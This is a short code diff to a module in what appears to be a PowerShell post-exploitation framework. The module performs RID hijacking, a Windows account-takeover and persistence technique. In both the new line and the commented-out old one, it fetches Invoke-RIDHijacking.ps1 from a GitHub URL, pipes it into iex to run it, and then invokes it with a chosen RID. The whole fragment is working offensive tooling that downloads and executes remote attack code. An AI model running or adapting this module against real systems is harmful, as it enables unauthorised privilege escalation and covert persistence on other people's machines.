@@ -30,7 +30,8 @@ class CustomModule(Module):
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/r4wd3r/RID-Hijacking/master/Invoke-RIDHijacking.ps1');"
+        function = '(make_request -URL https://raw.githubusercontent.com/r4wd3r/RID-Hijacking/master/Invoke-RIDHijacking.ps1) | iex'
+        #function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/r4wd3r/RID-Hijacking/master/Invoke-RIDHijacking.ps1');"
         function += 'Invoke-RIDHijacking -RID {}'.format(self.args["RID"])
 
         if self.args["user"]:
